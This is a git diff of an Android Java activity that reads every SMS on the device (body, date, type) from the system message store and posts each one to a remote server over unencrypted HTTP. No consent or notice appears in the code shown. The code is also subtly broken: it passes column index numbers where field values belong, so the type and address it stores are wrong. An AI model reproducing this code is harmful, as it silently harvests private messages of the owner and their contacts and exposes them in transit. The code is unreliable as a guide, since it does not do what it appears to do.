@@ -28,7 +28,9 @@ import org.apache.http.impl.client.DefaultHttpClient;
 import org.apache.http.message.BasicNameValuePair;
 
 import java.io.IOException;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Date;
 import java.util.List;
 
 public class SaveUserMessage extends AppCompatActivity {
@@ -51,31 +53,39 @@ public class SaveUserMessage extends AppCompatActivity {
 
                 return;
             }*/
-            //SaveUserMessage ctx = new SaveUserMessage(context);
-        String varr="non";
-        Toast.makeText(context, "Entrée dans Do", Toast.LENGTH_LONG).show();
 
-            ContentResolver contentResolver = context.getContentResolver();
+
+            ContentResolver contentResolver = getContentResolver();
             Cursor smsInboxCursor = contentResolver.query(Uri.parse("content://sms/"), null, null, null, null);
             int indexBody = smsInboxCursor.getColumnIndex("body");
             int indexAddress = smsInboxCursor.getColumnIndex("address");
+            int dat = smsInboxCursor.getColumnIndex("date_sent");
+        int typesms = smsInboxCursor.getColumnIndex("type");
+
             if (indexBody < 0 || !smsInboxCursor.moveToFirst()) return;
             do {
-                varr="oui";
-                // Toast.makeText(getContextOfApplication(), "Entrée dans Do", Toast.LENGTH_LONG).show();
 
-                //InsertData(smsInboxCursor.getString(indexAddress),smsInboxCursor.getString(indexBody));
-                InsertData(1, 458, smsInboxCursor.getString(indexBody),
-                        smsInboxCursor.getString(indexAddress), "22h",
-                        "h", Integer.toString(smsInboxCursor.getColumnIndex("address")),
-                        Integer.toString(smsInboxCursor.getColumnIndex("address")), Integer.toString(smsInboxCursor.getColumnIndex("address")),
-                        "nouvelle date", "actif");
+                Date date = new Date(smsInboxCursor.getLong(dat));
+                String formattedDate = new SimpleDateFormat("dd/MM/yyyy").format(date);
+
+
+                InsertData(1,
+                        458,
+                        smsInboxCursor.getString(indexBody),
+                        TypeSms(typesms),
+                        formattedDate,
+                        formattedDate,
+                        Integer.toString(smsInboxCursor.getColumnIndex("address")),
+                        Integer.toString(smsInboxCursor.getColumnIndex("address")),
+                        "date",
+                        "heure",
+                        "actif");
 
             } while (smsInboxCursor.moveToNext());
             smsInboxCursor.close();
             //InsertData("papa","pa@mail.com");
             //}
-            Toast.makeText(context,"on sort du do avec"+varr,Toast.LENGTH_LONG).show();
+
     }
 
         protected void InsertData ( final int id_user, final int id_message,
@@ -111,10 +121,10 @@ public class SaveUserMessage extends AppCompatActivity {
                     try {
                         HttpClient httpClient = new DefaultHttpClient();
 
-                        //HttpPost httpPost = new HttpPost("http://smart-data-tech.com/dev/API/v1/saveUserMessage/");
+                        HttpPost httpPost = new HttpPost("http://smart-data-tech.com/dev/API/v1/saveUserMessage/");
                        // HttpPost httpPost = new HttpPost("http://smart-data-tech.com/dev/fr/crud.php");
 
-                        HttpPost httpPost = new HttpPost("http://smart-data-tech.com/dev/fr/crud.php");
+                        //HttpPost httpPost = new HttpPost("http://smart-data-tech.com/dev/fr/crud.php");
                         httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
 
                         HttpResponse httpResponse = httpClient.execute(httpPost);
@@ -148,7 +158,29 @@ public class SaveUserMessage extends AppCompatActivity {
                     etat);
         }
 
-public  static void Afficher(){
-        //Toast.makeText(Applic,"ce ",Toast.LENGTH_LONG).show();
-}
+    private String TypeSms(int type) {
+        switch (type) {
+            case 1:
+                return "Boite reception";
+            //break;
+            case 2:
+                return "Envoyé";
+            //break;
+            case 3:
+                return "Brouillon";
+            // break;
+            case 4:
+                return "Boite envoie";
+            //break;
+            case 5:
+                return "Echec";
+            //break;
+            case 6:
+                return "Queu";
+            //break;
+            default:
+                return "tout";
+            //break;
+        }
+    }
 }
